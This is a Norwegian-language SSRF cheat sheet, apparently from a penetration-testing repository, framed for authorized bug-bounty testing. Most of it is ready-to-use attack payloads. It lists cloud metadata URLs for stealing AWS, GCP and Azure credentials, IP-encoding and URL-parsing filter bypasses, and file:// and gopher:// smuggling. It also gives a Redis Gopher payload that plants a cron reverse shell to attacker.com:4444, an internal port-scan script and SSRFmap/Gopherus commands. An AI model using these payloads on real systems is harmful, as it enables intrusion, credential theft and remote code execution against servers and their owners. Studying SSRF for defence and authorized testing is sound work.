# 🌐 SSRF – Server-Side Request Forgery

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Server-Side Request Forgery (forespørsler sendt via serveren)
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

> **Begreper og miljø:** SSRF får serveren til å sende forespørsler. Blind SSRF observeres via indirekte tegn, men et DNS-oppslag alene beviser ikke datatilgang. URL-tolking, omdirigeringer, støttede protokoller, nettverk og autentisering bestemmer utfallet; alternative IP-formater er ikke universelle. IMDSv1-eksemplene gjelder ikke uendret når AWS krever IMDSv2-token; se [AWS-dokumentasjonen](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-options.html). En HTTP-URL mot en ikke-HTTP-port snakker ikke automatisk tjenestens protokoll. Redis/Gopher- og rå HTTP-eksemplene er forenklede og miljøavhengige. Portskriptet kan feiltolke svar og håndterer ikke nettverksfeil; det beviser ikke at en port er åpen. Originalverdier og kode er bevart.

---

## 🎯 Hva er SSRF

**SSRF** lar en angriper få serveren til å sende forespørsler til utilsiktede steder, og kan gi tilgang til interne tjenester eller metadata i skyen.

### Konsekvens
- 🔴 **Tilgang til interne nettverk** – undersøk interne tjenester
- 🔴 **Metadata i skyen** – stjel AWS-/GCP-påloggingsopplysninger
- 🔴 **Omgåelse av brannmurer** – få tilgang til beskyttede ressurser
- 🔴 **RCE** – kan i noen tilfeller føre til kodekjøring

---

## 🔍 Hvor du bør lete

### Vanlige parametere
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Vanlige sårbare funksjoner
```
- Henting og validering av URL-er
- PDF-generatorer
- Bildebehandling
- Filimport
- Webhooks
- API-integrasjoner
- Verktøy for uthenting av webinnhold
- Skjermbildetjenester
```

---

## 💉 Grunnleggende payloads

### Localhost
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Interne nettverk
```
# Klasse A
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Klasse B
http://172.16.0.1
http://172.31.255.255

# Klasse C
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Link-local
http://169.254.169.254
```

### Vanlige porter
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Alternativ HTTP
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁️ Metadata i skyen

### AWS
```
# Instansmetadata (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Bestemte opplysninger
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Med påkrevd header
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Krever header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡️ Omgåelsesteknikker

### Formater for IP-adresser
```
# Desimal
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Heksadesimal
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Oktal
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Blandet
http://127.1
http://127.0.1
http://0
```

### URL-koding
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Dobbel koding
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### DNS rebinding (endring av DNS-svar)
```
# Bruk tjenester som:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Sett opp egen DNS
your-domain.com → 127.0.0.1
```

### Problemer med URL-tolking
```
# Triks med @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Fragmenter
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Omvendt skråstrek
http://attacker.com\127.0.0.1
```

### Protokollsmugling
```
# Fil
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Kjede med åpen omdirigering
```
# Hvis nettstedet har en åpen omdirigering:
https://target.com/redirect?url=http://169.254.169.254/

# Omdiriger til internt mål
http://target.com/redirect?url=http://127.0.0.1:8080
```

### Omgåelse med IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Headerinjeksjon
```
# CRLF-injeksjon i URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

## 🔥 Utnyttelse

### Redis RCE via Gopher
```
# Generer payload
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### HTTP request smuggling
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Portskanning
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

## 📊 Hurtigreferanse

### Deteksjon
```
# Test for SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Undersøk responsen
- Mottatt DNS-spørring?
- Mottatt HTTP-forespørsel?
- Annerledes respons for interne IP-adresser?
```

### Konsekvensnivåer

| Mål | Konsekvens |
|--------|--------|
| Metadata i skyen | Kritisk – tyveri av påloggingsopplysninger |
| Interne API-er | Høy – datatilgang |
| Interne tjenester | Høy – mulig kodekjøring |
| Portskanning | Middels – informasjonslekkasje |

### Vanlige filtre og omgåelser

| Filter | Omgåelse |
|--------|--------|
| Blokker `localhost` | Bruk `127.0.0.1`, `0`, `[::1]` |
| Blokker `127.0.0.1` | Bruk desimal `2130706433` |
| Blokker private IP-adresser | Bruk DNS rebinding |
| Bare HTTP | Prøv `gopher://`, `file://` |
| Domene på tillatelsesliste | Bruk `@`-trikset eller åpen omdirigering |

---

## 🛠️ Verktøy

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (generator for Gopher-payloads)
python gopherus.py --exploit redis

# Collaborator/webhook for blind SSRF
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

## 📚 Ressurser

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 Utforsk SSRF i autoriserte tester!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
